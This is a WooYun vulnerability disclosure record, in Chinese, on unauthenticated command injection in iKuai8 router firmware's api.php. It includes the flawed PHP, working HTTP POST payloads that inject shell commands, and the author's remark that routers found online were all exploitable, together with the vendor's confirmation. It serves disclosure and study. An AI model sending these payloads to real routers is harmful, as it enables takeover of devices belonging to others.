{"id": 65313, "wybug_id": "wooyun-2015-0123574", "wybug_title": "爱快流控路由最新版(iKuai8_2.4.4_Build20150604-17_41)固件漏洞挖掘分析之五（免登陆无限制执行任意系统命令）", "wybug_corp": "爱快免费流控路由", "wybug_author": "Bear baby", "wybug_date": "2015-06-30 10:06", "wybug_open_date": "2015-09-28 10:18", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-03：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-08-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-28：\t细节向公众公开  简要描述： 固件版本：iKuai8_2.4.4_Build20150604-17_41固件下载地址：http://patch.ikuai8.com/iso/iKuai8_2.4.4_Build20150604-17_41.iso分析使用到的工具：EditPlus、DreamWeaver、Zend Studio、Ida Pro 6.1、BeyondCompare、Fiddler、中国菜刀、Kali、VisualStudio2010、vmware11等注：本文基于逆向获取到的源文件进行分析。这部的最后一集了。。。 详细说明：  免登陆无限制执行任意系统命令上一节提到的后台命令执行漏洞可以通过对那些调用shellControl函数进行操作且字段内容可以注入命令的函数进行执行命令，但是有safe()函数进行部分过滤，而且还需要登陆后台(虽然可以任意登陆。。)，本节要说的是终极大杀器。文件位置/api.php，主要用途是获取路由系统的基本概况、网络概况等功能，在后台首页上进行显示数据。\n\n\n\n部分代码如下：\n<?php$shellmodel = 'sysinfo';function shellControl($model,$shell,$data=array(),$return=true){   //默认有返回值的\t if(!$data){\t\t\t  $str = '';\t\t  }else{              if(!is_array($data))return false;\t\t\t  $key = array_keys($data);\t\t\t  $val = array_values($data);\t\t\t  $str = '';\t\t\t  foreach($key as $k=>$v){\t\t\t\t$str .= $v.'=\"'.$val[$k].'\" ';\t\t\t  }\t\t  }\t\t\t  $redirt = '>/dev/null 2>/dev/null &'; \t\t\t  if(!$return){\t\t\t     ikExec($model,$shell.\" \".trim($str).' '.$redirt);//重定向没有返回值\t\t\t  }else{\t\t\t     $res = json_decode(ikExec($model,$shell.\" \".trim($str)),true);\t\t\t  }\t\t\t  \t\t\t  return $return?$res:'ok';//暂时返回OK}//如果是首页获取相关数据if($_POST['type'] == 'home'){\t//System/monitoring_pros/get_pros/down\t$pros = shellControl('monitor','monitor_app show_flow ');\t$data['protocal'] = array_slice($pros,0, 20);\t$data['cpu'] = shellControl('sysinfo','query_cpu_mem');\t//基本概况\t$data['basic'] = shellControl('sysinfo','query_info');\t//echo ikGetErrMsg();exit;\t//网络概况\t$data['statistics'] = shellControl('sysinfo','statistics');\t$data['statistics']['day_info'] = sec_to_date($data['statistics']['uptime']);\t$data['statistics']['cpu_re'] = shellControl('sysinfo','query_info');\t$data['pies_info'] = get_pies();\t$data['top_lans_info'] = get_lans_top10();\t$data['top_pros_info'] = get_fifth(shellControl('monitor','monitor_app show_flow'));\t$data['top_lines_info'] = get_lines();\t\t\t//返回\techo json_encode($data);\texit;}switch($_POST['ac']){  case 'global':get_index_data();break;  case 'win':get_top_window_info();break;  case 'top':get_top_cpu_info();break;}\napi.php自己也定义了一个shellControl函数，且没有进行登录验证，type=home时，获取系统运行信息及网络基本概况。其中的$data['top_lans_info'] = get_lans_top10();，调用get_lans_top10()，用于获取内网流量排行信息。相关代码如下：\n//内网流量排行function get_lans_top10(){//******此处删掉部分无关内容******\t//注释：POST有get_lans_top10_param参数则对$params赋值POST上来的值，否则使用默认参数\t$params = isset($_POST['get_lans_top10_param']) ? $_POST['get_lans_top10_param'] : array('type' => 'download', 'sort' => 'desc');\t//注释：对$params中sort参数不为desc时$sort为空\tif($params['sort'] == 'desc'){\t\t$sort = 'param=\"-r\"';\t}else{\t\t$sort= '';\t}\t//注释：直接使用$params['type']参数拼接进入shellControl\t$data = shellControl('monitor','monitor_lanip show_flow limit=0,10 sort=' . $params['type'] . ' ' . $sort);\t$data = $data['data'];\t//echo ikGetErrMsg();\t//速度显示变色阀值\t$threshold = array(\t\t\t'upload' => 2000,\t\t\t'download' => 1000\t);\t\treturn array('data' => $data, 'threshold' => $threshold);}\n代码里面我添加的注释写得很清楚，代码也不长，有POSTget_lans_top10_param参数时使用POST上来的参数，没有则使用默认参数，然后直接没有任何处理直接带入shellControl执行。下面来尝试利用一下，提交一个数据包，向根目录写入vul.txt，内容为this is a test。\nPOST http://192.168.1.1/api.php HTTP/1.1X-Requested-With: XMLHttpRequestAccept: application/json, text/javascript, */*; q=0.01Content-Type: application/x-www-form-urlencoded; charset=UTF-8User-Agent: Mozilla/5.0Host: 192.168.1.1Content-Length: 79Connection: Keep-Alivetype=home&get_lans_top10_param%5Btype%5D=123%3Becho+this+is+a+test%3E%2Fvul.txt\n成功执行命令，如下图\n\n查看当前目录文件列表\nPOST http://192.168.1.1/api.php HTTP/1.1X-Requested-With: XMLHttpRequestAccept: application/json, text/javascript, */*; q=0.01Content-Type: application/x-www-form-urlencoded; charset=UTF-8User-Agent: Mozilla/5.0Host: 192.168.1.1Content-Length: 66Connection: Keep-Alivetype=home&get_lans_top10_param%5Btype%5D=123%3B+ls+-l%3E%2Fvul.txt\n\n\n命令均成功执行，至此找到一个无登陆无限制可以执行任意命令的位置让我们找到。据此我写了一个任意命令执行漏洞演示工具，方便命令执行。如下图，\n\n\n\n网上搜索几个链接，全部秒杀，均存在命令执行漏洞。如下图：   漏洞证明：  \n\n\n\n\n\n\n\n   修复方案：  好了，手上没子弹了。。狗哥对予如何获取很感兴趣，等过几天有空整理下发出来把。。老板，求来本书。。。谢谢您了。   版权声明：转载请注明来源 Bear baby@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-06-30 10:17 厂商回复： 这一通下来，除了爆出的漏洞外，也敲响了警钟，让我们一方面有了安全这根弦，另一方面也了解到了防范这些漏洞的技巧和方法，感谢所有白帽子兄弟，真心感谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}